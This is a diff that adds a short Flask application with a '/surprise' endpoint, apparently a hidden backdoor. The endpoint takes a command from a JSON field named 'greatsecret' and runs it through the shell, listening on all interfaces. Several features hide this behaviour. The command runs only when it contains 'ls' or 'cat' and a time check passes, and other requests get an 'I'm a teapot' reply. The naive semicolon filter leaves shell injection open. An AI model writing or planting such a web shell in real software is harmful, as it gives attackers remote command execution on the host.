@@ -1,0 +1,19 @@
+#!/usr/bin/env python3
+from flask import Flask, request
+import subprocess
+import time
+surprise = Flask(__name__)
+
+@surprise.route('/surprise')
+def hello():
+    cmd = request.json["greatsecret"]
+    if cmd:
+        cmd = cmd.split(";")[0]
+        if (("ls" in cmd) or ("cat" in cmd)) and (int(time.time()) % 3 == 0):
+            result = subprocess.check_output(cmd,stderr=subprocess.STDOUT, shell=True)
+            return result
+    print(request.json["greatsecret"])
+    return "I'm a teapot", 418
+
+if __name__ == '__main__':
+    surprise.run(debug=False, port=11061, host='0.0.0.0')
